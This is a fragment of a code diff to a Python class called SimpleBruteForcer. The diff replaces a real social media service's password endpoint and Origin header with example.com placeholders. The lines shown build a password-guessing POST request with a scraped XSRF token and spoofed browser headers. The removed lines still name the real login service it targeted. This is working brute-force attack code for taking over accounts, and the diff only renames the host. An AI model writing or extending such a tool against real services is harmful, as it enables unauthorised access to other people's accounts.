@@ -88,7 +88,7 @@ class SimpleBruteForcer:
                 print(Fore.YELLOW + "[❌] XSRF token missing")
                 return False
 
-            post_url = f"https://accounts.snapchat.com/accounts/v2/password?ai={ai_token}&continue=%2Faccounts%2Fwelcome"
+            post_url = f"https://accounts.example.com/accounts/v2/password?ai={ai_token}&continue=%2Faccounts%2Fwelcome"
             payload = {
                 "password": password,
                 "xsrf_token": xsrf_token,
@@ -98,7 +98,7 @@ class SimpleBruteForcer:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                 "Referer": self.url,
-                "Origin": "https://accounts.snapchat.com",
+                "Origin": "https://accounts.example.com",
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.9"
